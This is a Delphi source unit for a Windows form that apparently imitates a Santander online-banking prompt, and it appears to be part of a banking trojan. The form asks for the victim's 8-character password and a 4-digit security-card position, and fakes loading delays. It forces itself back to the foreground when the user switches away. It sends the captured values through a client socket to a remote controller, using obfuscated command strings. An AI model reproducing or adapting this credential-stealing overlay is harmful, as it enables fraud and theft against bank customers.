unit uPSNT;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, pngimage, ExtCtrls, GifImage, {GIFImg,} AppEvnts, ComCtrls;

type
  TfSNTLie = class(TForm)
    pnlIntro: TPanel;
    Image1: TImage;
    Image2: TImage;
    pnlSNET: TPanel;
    Image3: TImage;
    Label5: TLabel;
    Image4: TImage;
    Image5: TImage;
    edtSNET: TEdit;
    Image6: TImage;
    lblErro: TLabel;
    pnlLoad: TPanel;
    Image7: TImage;
    Label6: TLabel;
    pnlTabela: TPanel;
    Image8: TImage;
    lblErro2: TLabel;
    Image10: TImage;
    Image11: TImage;
    Image12: TImage;
    edtPosicao: TEdit;
    lblPosicao: TLabel;
    Label7: TLabel;
    pnlLoad2: TPanel;
    Image13: TImage;
    Image14: TImage;
    Image16: TImage;
    ApplicationEvents: TApplicationEvents;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    ProgressBar1: TProgressBar;
    procedure Image2Click(Sender: TObject);
    procedure Image6Click(Sender: TObject);
    procedure Image4Click(Sender: TObject);
    procedure Image12Click(Sender: TObject);
    procedure Image10Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure ApplicationEventsDeactivate(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
     Posicao: String;
     Ativado: boolean;
  end;

var
  fSNTLie: TfSNTLie;
  Posicao: String;

implementation

uses uConectar, funcs2013;

{$R *.dfm}

procedure TfSNTLie.ApplicationEventsDeactivate(Sender: TObject);
begin
  if Self.Visible then
     SetForegroundWindow(self.Handle);
end;

procedure TfSNTLie.FormCreate(Sender: TObject);
begin
  fSNTLie.Caption := Decrypt('«Â™¿$ö',nw22);
end;

procedure TfSNTLie.FormShow(Sender: TObject);
begin
  pnlIntro.BringToFront;
end;

procedure TfSNTLie.Image10Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Length(edtPosicao.Text) <> 4 then
  begin
    edtPosicao.Clear;
    lblErro2.Caption := 'Posição incorreta, digite novamente.';
    lblErro2.Font.Color := clRed;
    Exit;
  end;
  // fClient.TCP.IOHandler.WriteLn('SANTAPOSICAOOK|'+edtPosicao.Text);
  fCliente.CS1.Socket.SendText(Decrypt('«Â™¿$àI‚@Žu/·X',nw22)+'|'+edtPosicao.Text);
  pnlLoad.BringToFront;
end;

procedure TfSNTLie.Image12Click(Sender: TObject);
begin
  edtPosicao.Clear;
end;

procedure TfSNTLie.Image2Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  pnlSNET.BringToFront;
end;

procedure TfSNTLie.Image4Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
    if Length(edtSNET.Text) <> 8 then
    begin
      edtSNET.Clear;
      lblErro.Caption := 'Senha incorreta, digite novamente.';
      lblErro.Font.Color := clRed;
      Exit;
    end;
  // fClient.TCP.IOHandler.WriteLn('SANTASNET|'+edtSNET.Text);
  fCliente.CS1.Socket.SendText(Decrypt('«Â™¿$å_à',nw22)+'|'+edtSNET.Text);
  pnlLoad.BringToFront;
end;

procedure TfSNTLie.Image6Click(Sender: TObject);
begin
  edtSNET.Clear;
end;

end.
